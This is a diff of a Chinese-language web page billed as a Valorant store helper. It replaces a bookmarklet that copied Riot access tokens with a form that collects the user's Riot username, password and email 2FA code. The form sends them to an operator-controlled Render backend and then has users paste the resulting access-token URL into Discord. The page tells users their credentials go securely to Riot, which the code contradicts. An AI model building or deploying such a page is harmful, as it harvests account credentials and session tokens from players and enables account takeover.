@@ -3,55 +3,152 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Zenith Token 獲取助手</title>
+    <title>Zenith 特戰極速登入助手</title>
     <style>
         body { font-family: "Segoe UI", Arial, sans-serif; background-color: #0b0b0b; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
-        .container { background-color: #111111; border: 1px solid #222222; padding: 35px 25px; border-radius: 4px; max-width: 480px; width: 100%; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.8); }
+        .container { background-color: #111111; border: 1px solid #222222; padding: 35px 25px; border-radius: 4px; max-width: 400px; width: 100%; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.8); }
         h1 { font-size: 22px; font-weight: 700; letter-spacing: 2px; margin-bottom: 8px; color: #ff4655; }
         .subtitle { color: #888888; font-size: 13px; margin-bottom: 25px; }
-        .step-card { background-color: #161616; border: 1px solid #222222; padding: 20px; text-align: left; margin-bottom: 20px; border-radius: 4px; box-sizing: border-box; height: auto !important; }
-        .step-num { font-size: 12px; color: #ff4655; font-weight: 800; margin-bottom: 5px; display: block; }
-        .step-text { color: #cccccc; font-size: 14px; line-height: 1.6; margin-bottom: 15px; }
-        .drag-btn { display: block; width: 100%; padding: 12px 0; background-color: #ff4655; color: #ffffff; text-decoration: none; font-weight: 700; font-size: 15px; border-radius: 4px; text-align: center; box-sizing: border-box; transition: background 0.2s; border: none !important; }
-        .drag-btn:hover { background-color: #dc3d4b; }
-        textarea { width: 100%; height: 70px; background: #000; border: 1px solid #333; color: #fff; padding: 10px; box-sizing: border-box; margin-top: 10px; border-radius: 4px; resize: none; font-size: 12px; word-break: break-all; }
-        .tool-btn { background: #333; color: #fff; border: none; height: 40px; border-radius: 4px; cursor: pointer; margin-top: 10px; width: 100%; font-weight: bold; }
-        .tool-btn:hover { background: #444; }
+        .input-group { text-align: left; margin-bottom: 15px; }
+        label { display: block; font-size: 12px; color: #aaaaaa; margin-bottom: 5px; font-weight: 600; }
+        input { width: 100%; padding: 12px; background-color: #161616; border: 1px solid #333; color: #fff; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
+        input:focus { border-color: #ff4655; outline: none; }
+        .btn { display: block; width: 100%; padding: 12px 0; background-color: #ff4655; color: #ffffff; font-weight: 700; font-size: 15px; border-radius: 4px; cursor: pointer; border: none; margin-top: 20px; width: 100%; }
+        .btn:hover { background-color: #dc3d4b; }
+        .btn:disabled { background-color: #555; cursor: not-allowed; }
+        .result-box { margin-top: 20px; background: #000; padding: 15px; border-radius: 4px; display: none; text-align: left; }
+        .result-title { color: #ff4655; font-size: 12px; font-weight: bold; margin-bottom: 5px; }
+        textarea { width: 100%; height: 80px; background: #111; border: 1px solid #222; color: #00ffcc; font-size: 11px; resize: none; word-break: break-all; margin-top: 5px; padding: 10px; box-sizing: border-box; border-radius: 4px; }
+        .status-msg { color: #ffcc00; font-size: 13px; margin-top: 10px; text-align: left; min-height: 20px; }
     </style>
 </head>
 <body>
+
 <div class="container">
-    <h1>Zenith Token Assistant</h1>
-    <div class="subtitle">特戰每日商店金鑰極速獲取工具</div>
-    <div class="step-card">
-        <span class="step-num">方法一：標準還原格式書籤</span>
-        <div class="step-text">
-            1. 顯示瀏覽器書籤列（Ctrl+Shift+B）。<br>
-            2. 把下方按鈕重新拖曳到書籤列覆蓋舊的。<br>
-            3. 在特戰官網登入後點擊書籤，直接去 Discord 貼上！
+    <h1>Zenith Login Assistant</h1>
+    <div class="subtitle">放棄麻煩的書籤！輸入帳密一鍵極速獲取網址</div>
+    
+    <div id="loginForm">
+        <div class="input-group">
+            <label>RIOT 登入帳號 (Username)</label>
+            <input type="text" id="username" placeholder="請輸入遊戲登入帳號...">
         </div>
-        <a class="drag-btn" href="javascript:(function(){const u=window.location.href;const m=u.match(/access_token=([^&]+)/);if(m){let c='https://playvalorant.com/zh-tw/opt_in/#access_token='+m[1];const e=document.createElement('textarea');e.value=c;document.body.appendChild(e);e.select();document.execCommand('copy');document.body.removeChild(e);alert('🎉 複製成功！\n\n網址已自動還原為官方認證格式！\n請直接回 Discord 貼上送出！');}else{window.location.assign('https://auth.riotgames.com/authorize?client_id=play-valorant-web-prod&response_type=token+id_token&redirect_uri=https%3A%2F%2Fplayvalorant.com%2Fopt_in&scope=openid+link+ban&nonce=1');}})();">
-            ➔ 拖曳我到書籤列 ➔
-        </a>
+        <div class="input-group">
+            <label>RIOT 登入密碼 (Password)</label>
+            <input type="password" id="password" placeholder="請輸入遊戲登入密碼...">
+        </div>
+        
+        <div class="input-group" id="mfaGroup" style="display: none;">
+            <label style="color: #00ffcc;">請輸入電子郵件二步驟驗證碼 (2FA)</label>
+            <input type="text" id="mfaCode" placeholder="6 位數驗證碼">
+        </div>
+
+        <button class="btn" id="submitBtn" onclick="startAuth()">➔ 一鍵安全獲取商店網址</button>
+        <div class="status-msg" id="statusMsg"></div>
     </div>
-    <div class="step-card">
-        <span class="step-num">方法二：長網址乾淨裁剪框</span>
-        <div class="step-text">
-            如果點擊書籤被瀏覽器擋住，請把跳轉後那一長串帶有 404 的長網址複製，貼到下方格子裡：
-        </div>
-        <textarea id="inputUrl" placeholder="請在此貼上官方那一長串長網址..."></textarea>
-        <button class="tool-btn" onclick="processUrl()">➔ 一鍵轉換為標準短網址</button>
+
+    <div class="result-box" id="resultBox">
+        <div class="result-title">🎉 成功生成！請複製下方整條網址貼回 Discord：</div>
+        <textarea id="outputUrl" readonly></textarea>
+        <button class="btn" style="background:#333; margin-top:10px;" onclick="copyResult()">一鍵複製網址</button>
     </div>
 </div>
+
 <script>
-function processUrl() {
-    let input = document.getElementById('inputUrl').value.trim();
-    let match = input.match(/access_token=([^&]+)/);
-    if(!match) { alert('無法識別 Token，請確認輸入的是登入跳轉後的完整長網址！'); return; }
-    let cleanUrl = 'https://playvalorant.com/zh-tw/opt_in/#access_token=' + match[1];
-    let el = document.createElement('textarea'); el.value = cleanUrl; document.body.appendChild(el); el.select(); document.execCommand('copy'); document.body.removeChild(el);
-    alert('🎉 轉換並複製成功！\n\n已還原標準短網址格式，請立刻去 Discord 貼上送出！');
+// 🚨 這裡要填入你剛才在 Render 部署成功後拿到的免費後端網址！
+const BACKEND_URL = "https://你的新後端網址.onrender.com";
+
+async function startAuth() {
+    const user = document.getElementById('username').value.trim();
+    const pass = document.getElementById('password').value.trim();
+    const mfa = document.getElementById('mfaCode').value.trim();
+    const btn = document.getElementById('submitBtn');
+    const statusMsg = document.getElementById('statusMsg');
+    
+    if(!user || !pass) { alert('請填寫帳號和密碼！'); return; }
+    
+    btn.disabled = true;
+    statusMsg.innerText = "⏳ 正在啟動後端轉接橋樑（若伺服器在休眠，可能需要 15-30 秒）...";
+
+    try {
+        // Step 1: 透過後端初始化 Riot 授權
+        let initRes = await fetch(`${BACKEND_URL}/api/auth/init`, { method: "POST" });
+        if(!initRes.ok) throw new Error("後端初始化失敗");
+        
+        statusMsg.innerText = "🔑 正在將憑證安全送往 Riot 伺服器驗證...";
+
+        // Step 2: 透過後端提交帳密
+        let loginRes = await fetch(`${BACKEND_URL}/api/auth/login`, {
+            method: "PUT",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                type: "auth",
+                username: user,
+                password: pass,
+                remember: true
+            })
+        });
+        let loginData = await loginRes.json();
+
+        // 檢查是否需要二步驟驗證 (MFA)
+        if (loginData.type === "mfa") {
+            document.getElementById('mfaGroup').style.display = "block";
+            statusMsg.innerText = "🔒 偵測到二步驟驗證！請檢查信箱並輸入 6 位數驗證碼。";
+            btn.disabled = false;
+            
+            if (!mfa) {
+                alert("您的帳號啟用了二步驟驗證，請至信箱收信並填入驗證碼後，再次點擊按鈕！");
+                return;
+            }
+            
+            btn.disabled = true;
+            statusMsg.innerText = "⏳ 正在驗證 2FA 驗證碼...";
+            
+            // 提交 MFA 驗證碼
+            let mfaRes = await fetch(`${BACKEND_URL}/api/auth/login`, {
+                method: "PUT",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    type: "mfa",
+                    code: mfa,
+                    remember: true
+                })
+            });
+            loginData = await mfaRes.json();
+        }
+
+        // Step 3: 解析最終網址
+        if (loginData.response && loginData.response.parameters && loginData.response.parameters.uri) {
+            let originalUri = loginData.response.parameters.uri;
+            let match = originalUri.match(/access_token=([^&]+)/);
+            if (match) {
+                let finalUrl = "https://playvalorant.com/zh-tw/opt_in/#access_token=" + match[1];
+                document.getElementById('outputUrl').value = finalUrl;
+                document.getElementById('resultBox').style.display = "block";
+                document.getElementById('loginForm').style.display = "none";
+                statusMsg.innerText = "";
+            }
+        } else {
+            alert("登入失敗：請確認帳號密碼是否輸入正確！");
+            btn.disabled = false;
+            statusMsg.innerText = "❌ 驗證失敗，請重試。";
+        }
+
+    } catch (err) {
+        console.error(err);
+        alert("連線後端發生錯誤！請確認你的 Render 後端網址有沒有填錯，或確認伺服器狀態是否為 Live。");
+        btn.disabled = false;
+        statusMsg.innerText = "❌ 連線錯誤，請確認後端網址。";
+    }
+}
+
+function copyResult() {
+    let t = document.getElementById('outputUrl');
+    t.select();
+    document.execCommand('copy');
+    alert('🎉 複製成功！快回 Discord 貼上吧！');
 }
 </script>
+
 </body>
 </html>
